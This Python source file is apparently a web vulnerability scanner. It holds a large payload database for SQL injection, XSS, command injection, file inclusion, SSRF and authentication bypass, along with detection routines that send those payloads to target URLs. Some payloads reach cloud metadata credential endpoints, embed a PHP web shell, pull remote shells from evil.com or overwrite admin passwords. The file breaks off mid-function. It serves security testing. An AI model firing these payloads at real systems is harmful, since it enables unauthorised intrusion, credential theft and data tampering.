#!/usr/bin/env python3
"""
🏆 COMPLETE ENTERPRISE SCANNER 2025 - FULLY INTEGRATED 🏆
ALL Components Connected | Real Vulnerability Detection | AI/ML Integrated | Production Ready
"""

import asyncio
import aiohttp
import threading
import multiprocessing as mp
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor, as_completed
import queue
import time
import uuid
import logging
import traceback
import random
import string
import base64
import hashlib
import hmac
import pickle
import gzip
import sqlite3
import json
import re
import urllib.parse
from urllib.parse import urlparse, urljoin
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional, Tuple, Union, Callable
from dataclasses import dataclass, field, asdict
from enum import Enum
import os
import sys
import signal
import gc
import weakref
from pathlib import Path
import itertools
from collections import defaultdict, deque
import secrets
import psutil
import statistics
import math
import bcrypt
import jwt as pyjwt
from functools import wraps
import ssl
import certifi

# Import all our advanced components
from advanced_ai_ml_engine import (
    AIModelConfig, VulnerabilityDataset, DeepLearningVulnDetector,
    ComputerVisionAnalyzer, AdvancedNLPProcessor, MLOpsManager
)
from advanced_threading_engine import (
    AdvancedThreadingConfig, AdvancedConnectionPool, IntelligentTaskQueue,
    ScanTask, LoadBalancer, AutoScaler, DistributedTaskManager
)

# Web Framework with Security
from flask import Flask, request, jsonify, render_template_string, send_file, session, g
from flask_socketio import SocketIO, emit, join_room, leave_room
from flask_cors import CORS
from flask_jwt_extended import JWTManager, create_access_token, jwt_required, get_jwt_identity
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from werkzeug.security import generate_password_hash, check_password_hash

# HTTP Libraries
import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
from bs4 import BeautifulSoup
import lxml.html

# AI/ML Libraries
try:
    import numpy as np
    import pandas as pd
    from sklearn.ensemble import RandomForestClassifier, IsolationForest
    from sklearn.neural_network import MLPClassifier
    from sklearn.feature_extraction.text import TfidfVectorizer
    from sklearn.preprocessing import StandardScaler
    import joblib
    import tensorflow as tf
    import torch
    HAS_AI = True
except ImportError:
    HAS_AI = False

# Computer Vision
try:
    import cv2
    from PIL import Image
    HAS_CV = True
except ImportError:
    HAS_CV = False

# Browser automation
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    HAS_SELENIUM = True
except ImportError:
    HAS_SELENIUM = False

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s | %(levelname)8s | %(name)20s | %(funcName)15s:%(lineno)4d | %(message)s'
)
logger = logging.getLogger(__name__)

# ========== CORE VULNERABILITY DETECTION ENGINE ==========

@dataclass
class VulnerabilityResult:
    """Comprehensive vulnerability result"""
    vulnerability_id: str = field(default_factory=lambda: str(uuid.uuid4()))
    vulnerability_type: str = ""
    subtype: str = ""
    severity: str = "medium"
    confidence: float = 0.0
    
    # Target information
    target_url: str = ""
    method: str = "GET"
    parameter: str = ""
    payload: str = ""
    
    # Response analysis
    response_time: float = 0.0
    response_size: int = 0
    status_code: int = 200
    response_headers: Dict = field(default_factory=dict)
    response_body: str = ""
    
    # Detection details
    detection_method: str = ""
    evidence: str = ""
    error_indicators: List[str] = field(default_factory=list)
    
    # AI/ML analysis
    ai_confidence: float = 0.0
    ai_features: Dict = field(default_factory=dict)
    ml_prediction: str = ""
    
    # Risk assessment
    risk_score: float = 0.0
    business_impact: str = "low"
    exploitability: str = "low"
    
    # Remediation
    remediation: str = ""
    references: List[str] = field(default_factory=list)
    
    # Metadata
    discovered_at: datetime = field(default_factory=datetime.now)
    scan_id: str = ""
    
    def to_dict(self):
        """Convert to dictionary"""
        result = asdict(self)
        result['discovered_at'] = self.discovered_at.isoformat()
        return result

class PayloadDatabase:
    """Advanced payload database with mutation capabilities"""
    
    def __init__(self):
        self.payloads = defaultdict(list)
        self.mutations = {}
        self.effectiveness_stats = defaultdict(lambda: {'success': 0, 'total': 0})
        self._load_payloads()
        logger.info("Payload database initialized with advanced mutations")
    
    def _load_payloads(self):
        """Load comprehensive payload database"""
        # SQL Injection Payloads
        self.payloads['sql_injection'] = [
            # Time-based blind
            "1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND sleep(5))-- ",
            "1' AND (SELECT sleep(5) WHERE database() LIKE '%{db}%')-- ",
            "1'; WAITFOR DELAY '00:00:05'-- ",
            "1' AND (SELECT pg_sleep(5))-- ",
            
            # Boolean-based blind
            "1' AND (SELECT SUBSTRING(@@version,1,1))='5'-- ",
            "1' AND (ASCII(SUBSTRING((SELECT database()),1,1)))>97-- ",
            "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0-- ",
            "1' AND (SELECT user())='root'-- ",
            
            # Union-based
            "1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,database(),version()-- ",
            "1' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",
            "1' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- ",
            
            # Error-based
            "1' AND extractvalue(rand(),concat(0x3a,version()))-- ",
            "1' AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B)-- ",
            "1' AND updatexml(1,concat(0x3a,(SELECT database())),1)-- ",
            
            # Second-order SQL injection
            "admin'; INSERT INTO users (username, password) VALUES ('hacker', 'password');-- ",
            "user'; UPDATE users SET password='hacked' WHERE username='admin';-- ",
            
            # NoSQL injection
            "' || '1'=='1",
            "'; return db.users.find(); var dummy='",
            "admin'||''=='",
            "{\"$ne\": null}",
            "{\"$regex\": \".*\"}",
            
            # WAF bypass techniques
            "1'/**/AND/**/1=1-- ",
            "1'%23%0A%23%0D%0AAND%231=1-- ",
            "1' /*!50000AND*/ 1=1-- ",
            "1' /*!12345UNION*/ /*!12345SELECT*/ 1,2,3-- ",
        ]
        
        # XSS Payloads
        self.payloads['xss'] = [
            # Basic XSS
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            
            # Event handler XSS
            "<body onload=alert('XSS')>",
            "<input type='text' onmouseover=alert('XSS')>",
            "<div onclick=alert('XSS')>Click me</div>",
            "<a href='javascript:alert(\"XSS\")'>Click</a>",
            
            # WAF bypass XSS
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
            "<img src=\"x\" onerror=\"alert('XSS')\">",
            
            # SVG XSS
            "<svg><script>alert('XSS')</script></svg>",
            "<svg onload=\"alert('XSS')\"></svg>",
            "<svg><g onload=\"alert('XSS')\"></g></svg>",
            
            # CSS injection XSS
            "<style>@import'javascript:alert(\"XSS\")';</style>",
            "<link rel=stylesheet href=javascript:alert('XSS')>",
            
            # Modern framework bypasses
            "{{constructor.constructor('alert(\"XSS\")')()}}",
            "${alert('XSS')}",
            "<img src=1 onerror=alert(/XSS/.source)>",
            
            # DOM XSS
            "#<script>alert('DOM-XSS')</script>",
            "javascript:alert('XSS')",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
            
            # File upload XSS
            "<script>alert('XSS')</script>.jpg",
            "image.jpg<script>alert('XSS')</script>",
            
            # PostMessage XSS
            "<script>parent.postMessage('XSS','*')</script>",
            
            # WebSocket XSS
            "<script>var ws=new WebSocket('ws://evil.com');ws.onopen=function(){alert('XSS')}</script>",
        ]
        
        # Command Injection Payloads
        self.payloads['command_injection'] = [
            # Linux command injection
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "&& cat /etc/passwd",
            "|| cat /etc/passwd",
            "`cat /etc/passwd`",
            "$(cat /etc/passwd)",
            "; ls -la /",
            "; whoami",
            "; id",
            "; uname -a",
            "; ps aux",
            "; netstat -an",
            
            # Windows command injection
            "& type C:\\windows\\system32\\drivers\\etc\\hosts",
            "| type C:\\windows\\system32\\drivers\\etc\\hosts",
            "&& type C:\\boot.ini",
            "|| dir C:\\",
            "; dir",
            "; whoami",
            "; systeminfo",
            "; tasklist",
            "; netstat -an",
            
            # WAF bypass command injection
            ";{cat,/etc/passwd}",
            ";cat$IFS/etc/passwd",
            ";cat${IFS}/etc/passwd",
            ";cat</etc/passwd",
            ";cat%20/etc/passwd",
            ";cat+/etc/passwd",
            ";c\\a\\t /etc/passwd",
            
            # Code injection
            "; system('cat /etc/passwd')",
            "; exec('cat /etc/passwd')",
            "; shell_exec('cat /etc/passwd')",
            "; passthru('cat /etc/passwd')",
            "; eval('system(\"cat /etc/passwd\")')",
        ]
        
        # File Inclusion Payloads
        self.payloads['file_inclusion'] = [
            # Local File Inclusion (LFI)
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            
            # PHP wrappers
            "php://filter/read=convert.base64-encode/resource=index.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
            "expect://cat /etc/passwd",
            "zip://archive.zip%23file.txt",
            
            # Log poisoning
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log",
            "/proc/self/environ",
            "/proc/self/fd/0",
            
            # Windows files
            "C:\\windows\\system32\\drivers\\etc\\hosts",
            "C:\\boot.ini",
            "C:\\windows\\win.ini",
            "C:\\windows\\system.ini",
            
            # Cloud metadata
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            
            # Remote File Inclusion (RFI)
            "http://evil.com/shell.txt",
            "https://pastebin.com/raw/malicious",
            "ftp://evil.com/shell.txt",
        ]
        
        # SSRF Payloads
        self.payloads['ssrf'] = [
            # Internal network access
            "http://localhost",
            "http://127.0.0.1",
            "http://0.0.0.0",
            "http://[::1]",
            "http://169.254.169.254",
            "http://10.0.0.1",
            "http://172.16.0.1",
            "http://192.168.1.1",
            
            # Cloud metadata
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "http://169.254.169.254/metadata/identity/oauth2/token",
            
            # Protocol smuggling
            "gopher://127.0.0.1:6379/_FLUSHALL",
            "dict://127.0.0.1:6379/info",
            "file:///etc/passwd",
            "ldap://127.0.0.1",
            
            # Bypass techniques
            "http://localhost@evil.com",
            "http://evil.com#127.0.0.1",
            "http://127.1",
            "http://0x7f000001",
            "http://017700000001",
        ]
        
        # Authentication Bypass Payloads
        self.payloads['auth_bypass'] = [
            # SQL injection auth bypass
            "admin'--",
            "admin'/*",
            "admin' OR '1'='1'--",
            "admin' OR 1=1--",
            "admin') OR '1'='1'--",
            "admin') OR ('1'='1'--",
            "' OR 1=1--",
            "' OR 'a'='a",
            "' OR ''='",
            "1' OR '1' = '1",
            
            # NoSQL auth bypass
            "admin'||''=='",
            "admin' || '1'=='1",
            "{\"$ne\": null}",
            "{\"$gt\": \"\"}",
            "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
            
            # LDAP injection
            "admin)(&(password=*))",
            "admin)(|(password=*))",
            "*)(uid=*))(|(uid=*",
            
            # JWT manipulation
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
            
            # Header injection
            "X-Forwarded-For: 127.0.0.1",
            "X-Real-IP: 127.0.0.1",
            "X-Originating-IP: 127.0.0.1",
            "X-Remote-IP: 127.0.0.1",
        ]
        
        # API Security Payloads
        self.payloads['api_security'] = [
            # Mass assignment
            "{\"user_id\": 1, \"is_admin\": true}",
            "{\"role\": \"admin\", \"permissions\": [\"*\"]}",
            "{\"account_balance\": 999999}",
            
            # Path traversal in APIs
            "/api/users/1/../../admin/secrets",
            "/api/files/../../../etc/passwd",
            "/api/v1/users/%2e%2e%2f%2e%2e%2fadmin",
            
            # HTTP Parameter Pollution
            "user_id=1&user_id=2",
            "role=user&role=admin",
            
            # GraphQL injection
            "query { users { id username password } }",
            "mutation { deleteAllUsers }",
            "{ __schema { types { name } } }",
            
            # API versioning attacks
            "/api/v1/users/1",
            "/api/v2/users/1",
            "/api/internal/users/1",
            "/api/admin/users/1",
        ]
        
        # Business Logic Payloads
        self.payloads['business_logic'] = [
            # Price manipulation
            "{\"price\": -100, \"quantity\": 1}",
            "{\"discount\": 999, \"item_id\": 1}",
            "{\"amount\": 0.01, \"currency\": \"USD\"}",
            
            # Privilege escalation
            "{\"user_id\": \"../../admin\", \"action\": \"delete_all\"}",
            "{\"target_user\": \"admin\", \"new_role\": \"admin\"}",
            
            # Race conditions
            "concurrent_request_1",
            "concurrent_request_2",
            
            # Time manipulation
            "{\"start_date\": \"1970-01-01\", \"end_date\": \"2099-12-31\"}",
            "{\"expiry_date\": \"2099-12-31\"}",
            
            # Quantity manipulation
            "{\"quantity\": -1}",
            "{\"quantity\": 999999}",
            "{\"items\": []}",
        ]
    
    def get_payloads(self, vulnerability_type: str) -> List[str]:
        """Get payloads for specific vulnerability type"""
        return self.payloads.get(vulnerability_type, [])
    
    def mutate_payload(self, payload: str, target_info: Dict = None) -> List[str]:
        """Generate payload mutations"""
        mutations = [payload]  # Always include original
        
        # URL encoding mutations
        mutations.append(urllib.parse.quote(payload))
        mutations.append(urllib.parse.quote_plus(payload))
        
        # Double encoding
        mutations.append(urllib.parse.quote(urllib.parse.quote(payload)))
        
        # Case variations
        mutations.append(payload.upper())
        mutations.append(payload.lower())
        mutations.append(payload.swapcase())
        
        # Unicode encoding
        mutations.append(payload.encode('unicode_escape').decode('ascii'))
        
        # HTML entity encoding
        html_encoded = ""
        for char in payload:
            if ord(char) > 127 or char in '<>"&':
                html_encoded += f"&#{ord(char)};"
            else:
                html_encoded += char
        mutations.append(html_encoded)
        
        # Add context-specific mutations
        if target_info:
            db_type = target_info.get('database_type', '')
            if db_type == 'mysql':
                mutations.extend(self._mysql_specific_mutations(payload))
            elif db_type == 'postgresql':
                mutations.extend(self._postgresql_specific_mutations(payload))
            elif db_type == 'mssql':
                mutations.extend(self._mssql_specific_mutations(payload))
        
        return list(set(mutations))  # Remove duplicates
    
    def _mysql_specific_mutations(self, payload: str) -> List[str]:
        """MySQL-specific payload mutations"""
        mutations = []
        
        # MySQL comment variations
        if '--' in payload:
            mutations.append(payload.replace('-- ', '-- '))
            mutations.append(payload.replace('-- ', '/**/ '))
            mutations.append(payload.replace('-- ', '# '))
        
        # MySQL version-specific comments
        mutations.append(payload.replace('SELECT', '/*!50000SELECT*/'))
        mutations.append(payload.replace('UNION', '/*!50000UNION*/'))
        
        return mutations
    
    def _postgresql_specific_mutations(self, payload: str) -> List[str]:
        """PostgreSQL-specific payload mutations"""
        mutations = []
        
        # PostgreSQL-specific functions
        if 'version()' in payload:
            mutations.append(payload.replace('version()', 'version()'))
            mutations.append(payload.replace('version()', 'current_database()'))
        
        # PostgreSQL sleep function
        if 'sleep(' in payload:
            mutations.append(payload.replace('sleep(', 'pg_sleep('))
        
        return mutations
    
    def _mssql_specific_mutations(self, payload: str) -> List[str]:
        """Microsoft SQL Server-specific payload mutations"""
        mutations = []
        
        # MSSQL-specific delays
        if 'sleep(' in payload:
            mutations.append(payload.replace('sleep(5)', "WAITFOR DELAY '00:00:05'"))
        
        # MSSQL-specific functions
        mutations.append(payload.replace('database()', 'db_name()'))
        mutations.append(payload.replace('user()', 'system_user'))
        
        return mutations
    
    def update_effectiveness(self, payload: str, success: bool):
        """Update payload effectiveness statistics"""
        self.effectiveness_stats[payload]['total'] += 1
        if success:
            self.effectiveness_stats[payload]['success'] += 1
    
    def get_top_payloads(self, vulnerability_type: str, limit: int = 10) -> List[str]:
        """Get most effective payloads for a vulnerability type"""
        payloads = self.get_payloads(vulnerability_type)
        
        # Sort by effectiveness
        def effectiveness_score(payload):
            stats = self.effectiveness_stats[payload]
            if stats['total'] == 0:
                return 0.5  # Default score for untested payloads
            return stats['success'] / stats['total']
        
        sorted_payloads = sorted(payloads, key=effectiveness_score, reverse=True)
        return sorted_payloads[:limit]

class VulnerabilityDetectionEngine:
    """Advanced vulnerability detection with AI integration"""
    
    def __init__(self, ai_engine=None, nlp_processor=None):
        self.ai_engine = ai_engine
        self.nlp_processor = nlp_processor
        self.payload_db = PayloadDatabase()
        
        # Detection patterns
        self.sql_patterns = self._load_sql_detection_patterns()
        self.xss_patterns = self._load_xss_detection_patterns()
        self.cmd_patterns = self._load_cmd_detection_patterns()
        
        # Timing analysis
        self.baseline_times = {}
        
        logger.info("Vulnerability detection engine initialized")
    
    def _load_sql_detection_patterns(self) -> Dict:
        """Load SQL injection detection patterns"""
        return {
            'error_patterns': [
                r'mysql_fetch_array\(\)',
                r'ORA-\d{5}',
                r'Microsoft.*ODBC.*SQL Server',
                r'PostgreSQL.*ERROR',
                r'Warning.*\Wmysql_.*',
                r'valid MySQL result',
                r'MySQLSyntaxErrorException',
                r'quoted string not properly terminated',
                r'SQLite.*error',
                r'sqlite3\.OperationalError',
                r'SQL syntax.*MySQL',
                r'Warning.*SQLite3::'
            ],
            'time_indicators': [
                r'sleep\(\d+\)',
                r'benchmark\(',
                r'pg_sleep\(',
                r'waitfor\s+delay',
                r'dbms_pipe\.receive_message'
            ],
            'union_indicators': [
                r'union.*select',
                r'null.*null.*null'
            ],
            'information_disclosure': [
                r'root@',
                r'mysql.*version',
                r'postgresql.*version',
                r'microsoft.*sql.*server'
            ]
        }
    
    def _load_xss_detection_patterns(self) -> Dict:
        """Load XSS detection patterns"""
        return {
            'script_reflection': [
                r'<script[^>]*>.*?</script>',
                r'javascript:',
                r'on\w+\s*=',
                r'<iframe[^>]*src\s*=',
                r'<img[^>]*onerror\s*='
            ],
            'dom_indicators': [
                r'document\.',
                r'window\.',
                r'alert\(',
                r'confirm\(',
                r'prompt\('
            ],
            'encoding_bypass': [
                r'&#\d+;',
                r'%3C.*%3E',
                r'\\u[0-9a-fA-F]{4}'
            ]
        }
    
    def _load_cmd_detection_patterns(self) -> Dict:
        """Load command injection detection patterns"""
        return {
            'command_output': [
                r'root:.*:0:0:',
                r'bin:.*:1:1:',
                r'daemon:.*:2:2:',
                r'uid=\d+.*gid=\d+',
                r'Linux.*\d+\.\d+\.\d+',
                r'Windows.*Version.*\d+\.\d+',
                r'Microsoft Windows',
                r'total \d+'
            ],
            'error_indicators': [
                r'command not found',
                r'is not recognized as an internal',
                r'permission denied',
                r'access denied',
                r'cannot access'
            ]
        }
    
    async def detect_sql_injection(self, target_url: str, parameter: str, payloads: List[str]) -> List[VulnerabilityResult]:
        """Detect SQL injection vulnerabilities"""
        results = []
        
        # Establish baseline timing
        baseline_time = await self._get_baseline_time(target_url, parameter)
        
        for payload in payloads:
            try:
                # Test payload
                start_time = time.time()
                response = await self._send_request(target_url, parameter, payload)
                response_time = time.time() - start_time
                
                vulnerability = VulnerabilityResult(
                    vulnerability_type="sql_injection",
                    target_url=target_url,
                    parameter=parameter,
                    payload=payload,
                    response_time=response_time,
                    response_size=len(response.text) if response else 0,
                    status_code=response.status_code if response else 0,
                    response_body=response.text[:1000] if response else ""
                )
                
                # Time-based detection
                if response_time > baseline_time + 4.0:  # 4+ second delay
                    vulnerability.subtype = "time_based_blind"
                    vulnerability.confidence = 0.9
                    vulnerability.detection_method = "time_based_analysis"
                    vulnerability.evidence = f"Response time: {response_time:.2f}s (baseline: {baseline_time:.2f}s)"
                    results.append(vulnerability)
                    continue
                
                # Error-based detection
                if response and response.text:
                    for pattern in self.sql_patterns['error_patterns']:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            vulnerability.subtype = "error_based"
                            vulnerability.confidence = 0.85
                            vulnerability.detection_method = "error_pattern_matching"
                            vulnerability.evidence = f"SQL error detected: {pattern}"
                            vulnerability.error_indicators = [pattern]
                            results.append(vulnerability)
                            break
                
                # Boolean-based detection (response size difference)
                normal_response = await self._send_request(target_url, parameter, "1")
                if normal_response and response:
                    size_diff = abs(len(response.text) - len(normal_response.text))
                    if size_diff > 100:  # Significant size difference
                        vulnerability.subtype = "boolean_blind"
                        vulnerability.confidence = 0.7
                        vulnerability.detection_method = "response_size_analysis"
                        vulnerability.evidence = f"Response size difference: {size_diff} bytes"
                        results.append(vulnerability)
                
                # Union-based detection
                if response and 'union' in payload.lower():
                    for pattern in self.sql_patterns['union_indicators']:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            vulnerability.subtype = "union_based"
                            vulnerability.confidence = 0.95
                            vulnerability.detection_method = "union_response_analysis"
                            vulnerability.evidence = f"Union query successful: {pattern}"
                            results.append(vulnerability)
                            break
                
                # AI/ML analysis if available
                if self.ai_engine and HAS_AI:
                    ai_analysis = await self._ai_analyze_response(response, payload, vulnerability)
                    if ai_analysis['is_vulnerable']:
                        vulnerability.ai_confidence = ai_analysis['confidence']
                        vulnerability.ai_features = ai_analysis['features']
                        vulnerability.ml_prediction = ai_analysis['prediction']
                        results.append(vulnerability)
                
            except Exception as e:
                logger.error(f"SQL injection testing error: {e}")
                continue
        
        return results
    
    async def detect_xss(self, target_url: str, parameter: str, payloads: List[str]) -> List[VulnerabilityResult]:
        """Detect XSS vulnerabilities"""
        results = []
        
        for payload in payloads:
            try:
                response = await self._send_request(target_url, parameter, payload)
                
                if not response:
                    continue
                
                vulnerability = VulnerabilityResult(
                    vulnerability_type="xss",
                    target_url=target_url,
                    parameter=parameter,
                    payload=payload,
                    response_size=len(response.text),
                    status_code=response.status_code,
                    response_body=response.text[:1000]
                )
                
                # Direct payload reflection
                if payload in response.text:
                    vulnerability.subtype = "reflected"
                    vulnerability.confidence = 0.8
                    vulnerability.detection_method = "payload_reflection"
                    vulnerability.evidence = f"Payload reflected in response"
                    
                    # Check for dangerous contexts
                    if self._check_dangerous_xss_context(response.text, payload):
                        vulnerability.confidence = 0.95
                        vulnerability.evidence += " in dangerous HTML context"
                    
                    results.append(vulnerability)
                    continue
                
                # Script tag detection
                for pattern in self.xss_patterns['script_reflection']:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        vulnerability.subtype = "reflected"
                        vulnerability.confidence = 0.9
                        vulnerability.detection_method = "script_tag_detection"
                        vulnerability.evidence = f"Script execution context detected: {pattern}"
                        results.append(vulnerability)
                        break
                
                # DOM-based XSS indicators
                for pattern in self.xss_patterns['dom_indicators']:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        vulnerability.subtype = "dom_based"
                        vulnerability.confidence = 0.7
                        vulnerability.detection_method = "dom_analysis"
                        vulnerability.evidence = f"DOM manipulation detected: {pattern}"
                        results.append(vulnerability)
                        break
                
                # AI/ML analysis
                if self.ai_engine and HAS_AI:
                    ai_analysis = await self._ai_analyze_response(response, payload, vulnerability)
                    if ai_analysis['is_vulnerable']:
                        vulnerability.ai_confidence = ai_analysis['confidence']
                        vulnerability.ai_features = ai_analysis['features']
                        results.append(vulnerability)
                
            except Exception as e:
                logger.error(f"XSS testing error: {e}")
                continue
        
        return results
    
    async def detect_command_injection(self, target_url: str, parameter: str, payloads: List[str]) -> List[VulnerabilityResult]:
        """Detect command injection vulnerabilities"""
        results = []
        
        # Establish baseline timing
        baseline_time = await self._get_baseline_time(target_url, parameter)
        
        for payload in payloads:
            try:
                start_time = time.time()
                response = await self._send_request(target_url, parameter, payload)
                response_time = time.time() - start_time
                
                if not response:
                    continue
                
                vulnerability = VulnerabilityResult(
                    vulnerability_type="command_injection",
                    target_url=target_url,
                    parameter=parameter,
                    payload=payload,
                    response_time=response_time,
                    response_size=len(response.text),
                    status_code=response.status_code,
                    response_body=response.text[:1000]
                )
                
                # Time-based detection (for sleep commands)
                if 'sleep' in payload and response_time > baseline_time + 4.0:
                    vulnerability.subtype = "time_based"
                    vulnerability.confidence = 0.9
                    vulnerability.detection_method = "time_based_analysis"
                    vulnerability.evidence = f"Command execution delay: {response_time:.2f}s"
                    results.append(vulnerability)
                    continue
                
                # Output-based detection
                for pattern in self.cmd_patterns['command_output']:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        vulnerability.subtype = "output_based"
                        vulnerability.confidence = 0.95
                        vulnerability.detection_method = "command_output_analysis"
                        vulnerability.evidence = f"Command output detected: {pattern}"
                        results.append(vulnerability)
                        break
                
                # Error-based detection
                for pattern in self.cmd_patterns['error_indicators']:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        vulnerability.subtype = "error_based"
                        vulnerability.confidence = 0.8
                        vulnerability.detection_method = "error_analysis"
                        vulnerability.evidence = f"Command error detected: {pattern}"
                        results.append(vulnerability)
                        break
                
            except Exception as e:
                logger.error(f"Command injection testing error: {e}")
                continue
        
        return results
    
    async def detect_file_inclusion(self, target_url: str, parameter: str, payloads: List[str]) -> List[VulnerabilityResult]:
        """Detect file inclusion vulnerabilities"""
        results = []
        
        for payload in payloads:
            try:
                response = await self._send_request(target_url, parameter, payload)
                
                if not response:
                    continue
                
                vulnerability = VulnerabilityResult(
                    vulnerability_type="file_inclusion",
                    target_url=target_url,
                    parameter=parameter,
                    payload=payload,
                    response_size=len(response.text),
                    status_code=response.status_code,
                    response_body=response.text[:1000]
                )
                
                # Check for file content indicators
                file_indicators = [
                    r'root:.*:0:0:',  # /etc/passwd
                    r'bin:.*:1:1:',   # /etc/passwd
                    r'# hosts file',  # hosts file
                    r'\[boot loader\]',  # boot.ini
                    r'\[operating systems\]',  # boot.ini
                    r'for 16-bit app support',  # win.ini
                    r'<?php.*?>',  # PHP file
                    r'<html.*>',  # HTML file
                ]
                
                for pattern in file_indicators:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        vulnerability.subtype = "local_file_inclusion"
                        vulnerability.confidence = 0.9
                        vulnerability.detection_method = "file_content_analysis"
                        vulnerability.evidence = f"File content detected: {pattern}"
                        results.append(vulnerability)
                        break
                
                # Check for PHP wrapper responses
                if 'php://filter' in payload and len(response.text) > 100:
                    try:
                        # Try to decode base64
                        decoded = base64.b64decode(response.text).decode('utf-8', errors='ignore')
                        if '<?php' in decoded or 'function' in decoded:
                            vulnerability.subtype = "php_wrapper_lfi"
                            vulnerability.confidence = 0.95
                            vulnerability.detection_method = "php_wrapper_analysis"
                            vulnerability.evidence = "PHP code disclosed via wrapper"
                            results.append(vulnerability)
                    except:
                        pass
                
            except Exception as e:
                logger.error(f"File inclusion testing error: {e}")
                continue
        
        return results
    
    async def detect_ssrf(self, target_url: str, parameter: str, payloads: List[str]) -> List[VulnerabilityResult]:
        """Detect SSRF vulnerabilities"""
        results = []
        
        for payload in payloads:
            try:
                response = await self._send_request(target_url, parameter, payload)
                
                if not response:
                    continue
                
                vulnerability = VulnerabilityResult(
                    vulnerability_type="ssrf",
                    target_url=target_url,
                    parameter=parameter,
                    payload=payload,
                    response_size=len(response.text),
                    status_code=response.status_code,
                    response_body=response.text[:1000]
                )
                
                # Check for internal service responses
                internal_indicators = [
                    r'redis_version',  # Redis
                    r'Server: nginx',  # Internal nginx
                    r'Apache.*Server',  # Internal Apache
                    r'HTTP/1\.[01] 200',  # HTTP response
                    r'memcached.*version',  # Memcached
                    r'SSH-2\.0',  # SSH service
                ]
                
                for pattern in internal_indicators:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        vulnerability.subtype = "internal_service_access"
                        vulnerability.confidence = 0.85
                        vulnerability.detection_method = "service_response_analysis"
                        vulnerability.evidence = f"Internal service response: {pattern}"
                        results.append(vulnerability)
                        break
                
                # Check for AWS metadata
                if '169.254.169.254' in payload and response.status_code == 200:
                    if any(indicator in response.text for indicator in ['ami-id', 'instance-id', 'security-credentials']):
                        vulnerability.subtype = "aws_metadata_access"
                        vulnerability.confidence = 0.95
                        vulnerability.detection_method = "aws_metadata_analysis"
                        vulnerability.evidence = "AWS metadata service accessible"
                        results.append(vulnerability)
                
            except Exception as e:
                logger.error(f"SSRF testing error: {e}")
                continue
        
        return results
    
    async def _send_request(self, url: str, parameter: str, payload: str) -> Optional[requests.Response]:
        """Send HTTP request with payload"""
        try:
            # Parse URL and add parameter
            parsed_url = urlparse(url)
            
            if parsed_url.query:
                params = urllib.parse.parse_qs(parsed_url.query)
                params[parameter] = [payload]
                new_query = urllib.parse.urlencode(params, doseq=True)
            else:
                new_query = f"{parameter}={urllib.parse.quote(payload)}"
            
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
            
            # Send request with timeout
            response = requests.get(test_url, timeout=10, allow_redirects=True)
            return response
            
        except Exception as e:
            logger.debug(f"Request failed: {e}")
            return None
    
    async def _get_baseline_time(self, url: str, parameter: str) -> float:
        """Get baseline response time"""
        cache_key = f"{url}#{parameter}"
        
        if cache_key in self.baseline_times:
            return self.baseline_times[cache_key]
        
        times = []
        for _ in range(3):  # Average of 3 requests
            start = time.time()
            response = await self._send_request(url, parameter, "1")
            if response:
                times.append(time.time() - start)
            else:
                times.append(1.0)  # Default time if request fails
        
        baseline = statistics.mean(times) if times else 1.0
        self.baseline_times[cache_key] = baseline
        return baseline
    
    def _check_dangerous_xss_context(self, html: str, payload: str) -> bool:
        """Check if XSS payload is in dangerous HTML context"""
        # Find payload position in HTML
        payload_pos = html.find(payload)
        if payload_pos == -1:
            return False
        
        # Check context around payload
        context_before = html[max(0, payload_pos-100):payload_pos].lower()
        context_after = html[payload_pos+len(payload):payload_pos+len(payload)+100].lower()
        
        # Dangerous contexts
        dangerous_contexts = [
            '<script',
            'javascript:',
            'onload=',
            'onerror=',
            'onclick=',
            'href=',
            '<iframe'
        ]
        
        full_context = context_before + context_after
